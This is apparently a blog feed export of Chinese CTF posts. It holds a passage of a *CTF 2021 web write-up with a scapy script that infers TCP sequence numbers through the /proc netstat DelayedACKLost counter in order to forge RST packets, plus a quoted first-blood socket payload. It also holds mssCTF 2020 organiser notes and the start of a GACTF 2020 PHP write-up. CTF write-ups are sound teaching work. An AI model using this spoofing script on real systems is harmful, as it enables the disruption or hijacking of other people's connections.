LINUX_MIB_TCPACKSKIPPEDSEQ, &amp;tp-&gt;last_oow_ack_time))</span><br><span class="line">        <span class="built_in">tcp_send_dupack</span>(sk, skb);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">tcp_reset_check</span>(sk, skb)) &#123;</span><br><span class="line">    <span class="built_in">tcp_reset</span>(sk, skb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们发的包不是RST，且不是SYN，如果seq检查不通过，且linux还不至于认为我们在flood它的话，会进到<code>tcp_send_dupack</code>，我们进去康康有什么</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">tcp_send_dupack</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">const</span> <span class="keyword">struct</span> sk_buff *skb)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">tcp_sock</span> *tp = <span class="built_in">tcp_sk</span>(sk);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">TCP_SKB_CB</span>(skb)-&gt;end_seq != <span class="built_in">TCP_SKB_CB</span>(skb)-&gt;seq &amp;&amp;</span><br><span class="line">        <span class="built_in">before</span>(<span class="built_in">TCP_SKB_CB</span>(skb)-&gt;seq, tp-&gt;rcv_nxt)) &#123;</span><br><span class="line">        <span class="built_in">NET_INC_STATS</span>(<span class="built_in">sock_net</span>(sk), LINUX_MIB_DELAYEDACKLOST);</span><br><span class="line">        <span class="built_in">tcp_enter_quickack_mode</span>(sk, TCP_MAX_QUICKACKS);</span><br><span class="line">        <span class="comment">// 省略</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">tcp_send_ack</span>(sk);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个before的换行位置是真的阴间，我看了半天才发现这玩意在条件判断<strong>里头</strong><br>这里有个很有意思的东西，<code>NET_INC_STATS(sock_net(sk), LINUX_MIB_DELAYEDACKLOST);</code><br>就是说如果我们发送的这个数据包的seq比当前想要接收到的seq要小的话，linux会将DELAYEDACKLOST的值增加1。<br>这个数值在哪里体现呢？在<code>/proc/&lt;pid&gt;/net/netstat</code>里头就有。</p><img src="/2021/01/18/Security/Writeup/*CTF-2021-Web/netstat.png" class="" title="netstat"><p>也就是说我们不仅能知道我们的seq对还是错（这样我们需要遍历整个int32，不至于到天涯海角吧至少80秒是有了），而且还能知道seq大还是小。<br>这样我们就能用小学二年级就学过的二分法，最多发32来个包，就能得到在窗口范围内的seq，进而伪造发送给client的RST包。</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        参考脚本    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> session</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">ses = session()</span><br><span class="line"><span class="comment"># conf.L3socket = L3RawSocket</span></span><br><span class="line">client = <span class="string">&#x27;172.21.0.3&#x27;</span></span><br><span class="line">server = <span class="string">&#x27;172.21.0.2&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build</span>(<span class="params">seq</span>):</span><br><span class="line">    ip = IP(src=server, dst=client)</span><br><span class="line">    tcp = TCP(sport=<span class="number">21587</span>, dport=<span class="number">7775</span>, flags=<span class="string">&quot;A&quot;</span>, seq=seq)</span><br><span class="line">    pkt = ip / tcp / <span class="string">&#x27;payload&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> pkt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> ses.get(<span class="string">f&#x27;http://<span class="subst">&#123;client&#125;</span>:5000/file&#x27;</span>, params=&#123;<span class="string">&#x27;name&#x27;</span>: name&#125;).text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">text</span>):</span><br><span class="line">    res = &#123;&#125;</span><br><span class="line">    lines = text.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(lines), <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(lines[i]):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        key, keys = lines[i].split(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        key, vals = lines[i + <span class="number">1</span>].split(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        res[key] = <span class="built_in">dict</span>(<span class="built_in">zip</span>(keys.split(<span class="string">&#x27; &#x27;</span>), vals.split(<span class="string">&#x27; &#x27;</span>)))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">netstat = parse(read(<span class="string">&#x27;/proc/1/net/netstat&#x27;</span>))</span><br><span class="line">initial = netstat[<span class="string">&#x27;TcpExt&#x27;</span>][<span class="string">&#x27;DelayedACKLost&#x27;</span>]</span><br><span class="line">seq_now = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">4</span>):</span><br><span class="line">    send(build(i &lt;&lt; <span class="number">27</span>))</span><br><span class="line">    netstat = parse(read(<span class="string">&#x27;/proc/1/net/netstat&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> netstat[<span class="string">&#x27;TcpExt&#x27;</span>][<span class="string">&#x27;DelayedACKLost&#x27;</span>] &gt; initial:</span><br><span class="line">        seq_now = i &lt;&lt; <span class="number">27</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>, <span class="number">31</span>):</span><br><span class="line">    send(build(seq_now | (<span class="number">1</span> &lt;&lt; (<span class="number">31</span> - i))))</span><br><span class="line">    netstat = parse(read(<span class="string">&#x27;/proc/1/net/netstat&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> netstat[<span class="string">&#x27;TcpExt&#x27;</span>][<span class="string">&#x27;DelayedACKLost&#x27;</span>] == initial + <span class="number">1</span>:</span><br><span class="line">        seq_now |= (<span class="number">1</span> &lt;&lt; (<span class="number">31</span> - i))</span><br><span class="line">    <span class="keyword">elif</span> netstat[<span class="string">&#x27;TcpExt&#x27;</span>][<span class="string">&#x27;DelayedACKLost&#x27;</span>] &gt; initial:</span><br><span class="line">        <span class="comment"># conflict</span></span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(seq_now)</span><br></pre></td></tr></table></figure>    </div></div><p>然而出题人，对不起，你这还是有非预期。</p><p><s>我们再来仔细看看<code>docker-compose.yml</code>，看看是不是少了什么（自行看附件去）</s><br><s>对的，没有depends_on，即使有可能也有问题。</s><br>修正：docker-compose.yml中确实有depends_on，但是仍然有启动顺序上的问题。</p><p>请读到这篇博客的同学熟背下面链接里的东西<br><a href="https://docs.docker.com/compose/startup-order/">https://docs.docker.com/compose/startup-order/</a></p><p>根据我个人的调查，一血的payload是这样的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    tcpSerSock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">    tcpSerSock.connect((<span class="string">&#x27;172.25.0.2&#x27;</span>, <span class="number">21587</span>))</span><br><span class="line">    tcpSerSock.send(<span class="string">b&#x27;*ctf&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(tcpSerSock.recv(<span class="number">1280</span>))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ERROR&quot;</span>, e)</span><br></pre></td></tr></table></figure><p>二血更是离谱，直接进去弹了个shell，上了一血的车，代码里直接就有flag（我也不知道为什么flag会在代码的注释里）</p><img src="/2021/01/18/Security/Writeup/*CTF-2021-Web/flag_in_py.png" class="" title="what??"><p>。。。所以说，这是多么悲伤的故事</p><h2 id="总结">总结</h2><p>没有。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;oh-my-note&quot;&gt;oh-my-note&lt;/h2&gt;
&lt;p&gt;签到题，观察源码：&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://blog.frankli.site/tags/CTF/"/>
    
    <category term="Writeup" scheme="https://blog.frankli.site/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>mssCTF 2020 手记</title>
    <link href="https://blog.frankli.site/2020/09/20/Dev/mssCTF%202020/"/>
    <id>https://blog.frankli.site/2020/09/20/Dev/mssCTF%202020/</id>
    <published>2020-09-19T16:00:00.000Z</published>
    <updated>2025-10-19T20:35:57.792Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>自2018年第一届以来已经办了三届中学生比赛了。无论从出题还是运维角度，mss都已经相对稳定。不出意料，比赛过程中存在着许多问题，况且今年由于疫情原因在线上进行了决赛，但总体而言，在多方努力与支持下，比赛还是相当不错的。</p><p>这份总结是对各位的总结的一个大杂烩，段落的作者将以以下的形式给出：</p><blockquote><p>作者id</p></blockquote><p>内容</p><h2 id="运维">运维</h2><h3 id="CTFd部署">CTFd部署</h3><blockquote><p>Frank</p></blockquote><p>与去年的情况类似，平台最后都基本落到了我手里。平台的部署实际上没有费太大功夫，所有的东西都是现成的。最终用的插件有：</p><ul><li>ACM评测插件（之前写好的，改了一点前端）</li><li>附件下发插件（By Reverier）</li><li>容器下发插件（改的ctfd-whale）</li></ul><p>大部分都是现成的，部署起来很方便。无非就是需要更换一下非本地资源文件的CDN并分离静态文件。<br>不过由于moeCTF时让rx提前研究了静态文件如何压缩、分离并由nginx单独serve，以后的比赛应该不用我干预了</p><h3 id="日志">日志</h3><blockquote><p>Reverier</p></blockquote><p>初赛太辛苦BlackW@tch了. 初赛Web题目采用了静态docker部署的方式, 所有选手共用一个环境. 赛前去看他部署的时候发现apache的日志输出直接映射到了stdout, 这样搞的没办法查看log了, 但是想着题目应该不会出啥大问题, 折腾了一会儿没折腾好就放弃了. 第二天就直接上线.</p><p>然后web题成功出问题了. 有一名选手拿到flag之后挂了个脚本持续删掉flag, 重启docker之后继续删, 活生生的把CTF变成了出题人和选手之间的AD. bw只想着赶快修好环境, 也忘记先导出日志抓人, 日志又被重定向到了stdout, 重启一下docker啥都没了, 最后想起来的时候人也没抓着, 比赛也快结束了.</p><blockquote><p>Frank</p></blockquote><p>决赛时由于Web题目统一部署到了同一台服务器，进行动态容器下发，便于日志的记录，采用了腾讯云的日志服务，能看到所有人启动了什么容器且能看到包括请求题在内的完整的请求记录，相对方便对做题进度与做题人进行监控。虽然决赛的web题目并没有很多人做出来，但是从日志还是可以看出很多人通过了一定的关卡的。</p><p>在以后的比赛中一定要做好题目日志的记录，时刻把握好做题人的进展。一来日志的收集也不麻烦（当然要提前熟悉好），二来好处多多：</p><ul><li>方便反作弊（最直接的原因）</li><li>腾讯云日志免费保留14天，期间如果有人举报，可以随时对现场进行还原。</li><li>比赛中把握出题人的做题状况可以适时放hint</li></ul><p>上面的这些主要面对的是web题目，但对别的方向理应也有一定参考价值。</p><h3 id="关于插件与反作弊">关于插件与反作弊</h3><blockquote><p>Reverier</p></blockquote><p>在讨论平台的反作弊措施时有人提出了能否给不同选手分发不同题目文件的想法, 思索了一下觉得可行, 我便答应下来, 然后投入到静态题目文件自动分发插件的工作当中. 由于时间紧急就没能好好研究CTFd的文件上传与储存机制, 最开始的想法是创建一种新的挑战类型, 然后慢慢改; 后来写好之后发现数据库冲突了, 测试了好久依旧无法实现. 经Frank的提示, 发现其实只要创建一种新的flag类型即可. 时间紧急就采用了最简单的写法, 在api/v1/challenges.py里直接判断flag类型然后返回对应的文件, 简单粗暴. 这样写出来的插件由于更改了平台原有的文件, 所以没法即插即用, 等有时间了好好研究一下如何在不更改原有api的情况下实现自动分发.</p><p>初赛过程中自动分发插件倒工作良好, 没出什么幺蛾子.</p><p>复赛的账号分发任务交给我来做了, 采用自动注册脚本没费什么力气, 然后发送邮件拜托洛千用工具人做法全部发送到了选手的邮箱. 自动分发插件依旧沿用初赛的插件. Frank收集了所有web和pwn题目之后采用CTFd-Whale插件把题目弄成了动态的, 选手启动自己专属的docker环境做题, flag也各不相同, 防止作弊的同时也有效避免了初赛选手删flag的问题. PPC评测由于Windows下换行符CRLF的问题导致测试题目部分选手写的代码没有通过, 不过没什么大碍. 整个复赛过程中平台运行情况挺稳定的, 整个复赛过程中动态题目总共创建了487次docker环境, 其中用于测试题目创建了51次, 选手解题创建了436次, 其中陈**启动了35次题目环境, 杜**启动了32次, 陈**启动了29次, 在&quot;浪费服务器性能排行榜&quot;上夺得前三.</p><h2 id="出题与审题">出题与审题</h2><p>题目很多都是让19级的学弟出的，完整的题目负责列表如下：</p><table><thead><tr><th style="text-align:center">场次</th><th style="text-align:center">分类</th><th style="text-align:center">题目名</th><th style="text-align:center">出题人</th><th style="text-align:center">|</th><th style="text-align:center">场次</th><th style="text-align:center">分类</th><th style="text-align:center">题目名</th><th style="text-align:center">出题人</th></tr></thead><tbody><tr><td style="text-align:center">初赛</td><td style="text-align:center">Misc</td><td style="text-align:center">签到题</td><td style="text-align:center">luoqian</td><td style="text-align:center">|</td><td style="text-align:center">决赛</td><td style="text-align:center">Pwn</td><td style="text-align:center">gift</td><td style="text-align:center">eqqie</td></tr><tr><td style="text-align:center">初赛</td><td style="text-align:center">Misc</td><td style="text-align:center">Avicii</td><td style="text-align:center">luoqian</td><td style="text-align:center">|</td><td style="text-align:center">决赛</td><td style="text-align:center">Pwn</td><td style="text-align:center">fishing_master</td><td style="text-align:center">Lunatic</td></tr><tr><td style="text-align:center">初赛</td><td style="text-align:center">Misc</td><td style="text-align:center">到底说了什么</td><td style="text-align:center">Galaxy</td><td style="text-align:center">|</td><td style="text-align:center">决赛</td><td style="text-align:center">Pwn</td><td style="text-align:center">Wal1et</td><td style="text-align:center">Wal1et</td></tr><tr><td style="text-align:center">初赛</td><td style="text-align:center">Misc</td><td style="text-align:center">抽卡游戏</td><td style="text-align:center">zkonge</td><td style="text-align:center">|</td><td style="text-align:center">决赛</td><td style="text-align:center">Web</td><td style="text-align:center">hugme</td><td style="text-align:center">blackwatch</td></tr><tr><td style="text-align:center">初赛</td><td style="text-align:center">Web</td><td style="text-align:center">node</td><td style="text-align:center">LT</td><td style="text-align:center">|</td><td style="text-align:center">决赛</td><td style="text-align:center">Web</td><td style="text-align:center">xml’s the best</td><td style="text-align:center">Reclu3e</td></tr><tr><td style="text-align:center">初赛</td><td style="text-align:center">Web</td><td style="text-align:center">unserialize</td><td style="text-align:center">LT</td><td style="text-align:center">|</td><td style="text-align:center">决赛</td><td style="text-align:center">Web</td><td style="text-align:center">calc</td><td style="text-align:center">LT</td></tr><tr><td style="text-align:center">初赛</td><td style="text-align:center">Web</td><td style="text-align:center">readme</td><td style="text-align:center">blackwatch</td><td style="text-align:center">|</td><td style="text-align:center">决赛</td><td style="text-align:center">Web</td><td style="text-align:center">postme</td><td style="text-align:center">Reclu3e</td></tr><tr><td style="text-align:center">初赛</td><td style="text-align:center">Crypto</td><td style="text-align:center">easy_stream</td><td style="text-align:center">shallow</td><td style="text-align:center">|</td><td style="text-align:center">决赛</td><td style="text-align:center">Crypto</td><td style="text-align:center">easy_encrypt</td><td style="text-align:center">shallow</td></tr><tr><td style="text-align:center">初赛</td><td style="text-align:center">Crypto</td><td style="text-align:center">easy_math</td><td style="text-align:center">shallow</td><td style="text-align:center">|</td><td style="text-align:center">决赛</td><td style="text-align:center">Crypto</td><td style="text-align:center">hard_block</td><td style="text-align:center">shallow</td></tr><tr><td style="text-align:center">初赛</td><td style="text-align:center">Crypto</td><td style="text-align:center">easy_signin</td><td style="text-align:center">shallow</td><td style="text-align:center">|</td><td style="text-align:center">决赛</td><td style="text-align:center">Crypto</td><td style="text-align:center">easy_rsa</td><td style="text-align:center">shallow</td></tr><tr><td style="text-align:center">初赛</td><td style="text-align:center">Pwn</td><td style="text-align:center">whisper</td><td style="text-align:center">Lunatic</td><td style="text-align:center">|</td><td style="text-align:center">决赛</td><td style="text-align:center">Crypto</td><td style="text-align:center">easy_block</td><td style="text-align:center">shallow</td></tr><tr><td style="text-align:center">初赛</td><td style="text-align:center">Pwn</td><td style="text-align:center">blind</td><td style="text-align:center">eqqie</td><td style="text-align:center">|</td><td style="text-align:center">决赛</td><td style="text-align:center">Reverse</td><td style="text-align:center">hello</td><td style="text-align:center">Reverier</td></tr><tr><td style="text-align:center">初赛</td><td style="text-align:center">Pwn</td><td style="text-align:center">baby_format</td><td style="text-align:center">eqqie</td><td style="text-align:center">|</td><td style="text-align:center">决赛</td><td style="text-align:center">Reverse</td><td style="text-align:center">base_pro</td><td style="text-align:center">Reverier</td></tr><tr><td style="text-align:center">初赛</td><td style="text-align:center">Reverse</td><td style="text-align:center">doors</td><td style="text-align:center">Reverier</td><td style="text-align:center">|</td><td style="text-align:center">决赛</td><td style="text-align:center">Reverse</td><td style="text-align:center">coffee</td><td style="text-align:center">Reverier</td></tr><tr><td style="text-align:center">初赛</td><td style="text-align:center">Reverse</td><td style="text-align:center">search</td><td style="text-align:center">Reverier</td><td style="text-align:center">|</td><td style="text-align:center">决赛</td><td style="text-align:center">Reverse</td><td style="text-align:center">flower</td><td style="text-align:center">Reverier</td></tr><tr><td style="text-align:center">初赛</td><td style="text-align:center">Reverse</td><td style="text-align:center">CheckIn</td><td style="text-align:center">Ruby</td><td style="text-align:center">|</td><td style="text-align:center">决赛</td><td style="text-align:center">PPC</td><td style="text-align:center">灌水</td><td style="text-align:center">lhz&amp;cdcq</td></tr><tr><td style="text-align:center">初赛</td><td style="text-align:center">PPC</td><td style="text-align:center">栅栏加密</td><td style="text-align:center">lhz&amp;cdcq</td><td style="text-align:center">|</td><td style="text-align:center">决赛</td><td style="text-align:center">PPC</td><td style="text-align:center">安全评估</td><td style="text-align:center">lhz&amp;cdcq</td></tr><tr><td style="text-align:center">初赛</td><td style="text-align:center">PPC</td><td style="text-align:center">量子波动速读</td><td style="text-align:center">lhz&amp;cdcq</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">初赛</td><td style="text-align:center">PPC</td><td style="text-align:center">RSA加密</td><td style="text-align:center">lhz&amp;cdcq</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">初赛</td><td style="text-align:center">PPC</td><td style="text-align:center">肝活动</td><td style="text-align:center">lhz&amp;cdcq</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td></tr></tbody></table><h3 id="Web">Web</h3><blockquote><p>Frank</p></blockquote><p>Web题是被骂惨了，出题人上头了，审题人也上头了。<br>出题时应当充分考虑做题对象的水平，才能在比赛的同时达到提高水平的效果。像这次的题目，虽然我们自己已经习以为常，但是冷静思考，很多知识点如果要充分理解，需要对底层原理（python、PHP）有相当深入的了解。对于中学生而言，这是很不现实的。</p><p>还有一点可以改进的地方是出题前运维应当与出题人沟通好日志如何收集，并在审题阶段对日志收集功能进行测试。今年由于时间匆忙没有仔细地审题，出了各种问题。</p><h3 id="Pwn">Pwn</h3><h3 id="Reverse">Reverse</h3><blockquote><p>Reverier</p></blockquote><p>初赛逆向题目放出了三道, 有两道题目是我出的, 考点分别是指令虚拟化和全排列, 难度中等, 没爆0. 复赛题目放出了四道, 上午Java逆向和花指令, Java逆向是一个六元一次方程组求解, 两解; flower直接爆0了. 下午本来准备上happy出的一道vm, 但是上午看了看解题情况, 吓得不敢放了, 于是临时出了一个签到题, F5就能看见flag 的那种. 加上一道换表base64解密, 下午成功没有爆0. 有一说一题目质量出的有点低了… 没把握好选手的整体水平, 最后导致题目难度极不合理.</p><h3 id="PPC">PPC</h3><blockquote><p>cdcq</p></blockquote><p>出现的问题：</p><ul><li>检查用的时间不够，没有查常规项（例如数据范围，典型的常规项），不能因为题简单就不查</li><li>最后没有总测数据，结果导致std改了，但是样例忘了改</li><li>没有强调<strong>行末</strong>（而不是<strong>文末</strong>）空格。这个应当在评测插件中新增一个Presentation Error进行提示</li><li>使用多组数据。多组数据输入对出题人来说很方便，但是对OI选手来说，不习惯多组数据，会导致很多人忘记初始化，从而卡在非核心考察点上，降低比赛体验</li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;自2018年第一届以来已经办了三届中学生比赛了。无论从出题还是运维角度，mss都已经相对稳定。不出意料，比赛过程中存在着许多问题，况且今年由于疫情原因在线上进行了决赛，但总体而言，在多方努力与支持下，比赛还是相当不错的。&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://blog.frankli.site/tags/CTF/"/>
    
    <category term="DevOps" scheme="https://blog.frankli.site/tags/DevOps/"/>
    
  </entry>
  
  <entry>
    <title>GACTF 2020 Web 部分题目 Writeup</title>
    <link href="https://blog.frankli.site/2020/09/01/Security/Writeup/GACTF-2020-Web/"/>
    <id>https://blog.frankli.site/2020/09/01/Security/Writeup/GACTF-2020-Web/</id>
    <published>2020-08-31T16:00:00.000Z</published>
    <updated>2025-10-19T20:31:34.392Z</updated>
    
    <content type="html"><![CDATA[<h2 id="babyshop">babyshop</h2><p>上来一个小商城，懵了一圈以后扫了一下目录，发现有git泄露。源码脱下来以后发现进行了混淆。<br>这个混淆有意思啊，所有的变量名甚至都是有意义的，难不成是出题人人 工 混 淆？</p><p>简单浏览以后通过经验可以判断出，整个<code>init.php</code>大体分为两部分，<code>造化之神</code>用于混淆字符串常量，而<code>造化</code>函数则用于获取原字符串，是很常用的字符串常量混淆手段。再加上php的字符串可以作为函数调用，函数名也可以利用这种方式进行混淆。比如<code>造化(&quot;拢监纪浑诊余仍逃抹哀天夫&quot;)</code>实际上就是<code>stripos</code><br>于是我们可以写一个简单的小脚本进行字符串恢复，抛弃<code>造化</code>部分。脚本由于没有复用价值，就不放在这了。<code>测</code>，<code>获</code>，<code>赋</code>等工具函数也可以通过简单的正则匹配进行替换。</p><p>最终我们可以恢复出混淆前的代码：</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        题目源码    </div>    <div class='spoiler-content'>        <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;Off&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> 造齿轮</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $朝拜圣地;</span><br><span class="line">    <span class="keyword">protected</span> $贡品;</span><br><span class="line">    <span class="keyword">protected</span> $圣殿;</span><br><span class="line">    <span class="keyword">protected</span> $禁地;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;朝拜圣地 = <span class="string">&#x27;storage&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$this</span>-&gt;朝拜圣地)) <span class="title function_ invoke__">mkdir</span>(<span class="variable">$this</span>-&gt;朝拜圣地);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;禁地 = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;htaccess&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> 挖掘(<span class="params">$货物, $食物</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;禁地 <span class="keyword">as</span> $元素) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_COOKIE</span>[$食物], $元素) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;invaild &#x27;</span> . $食物);</span><br><span class="line">                <span class="keyword">return</span> 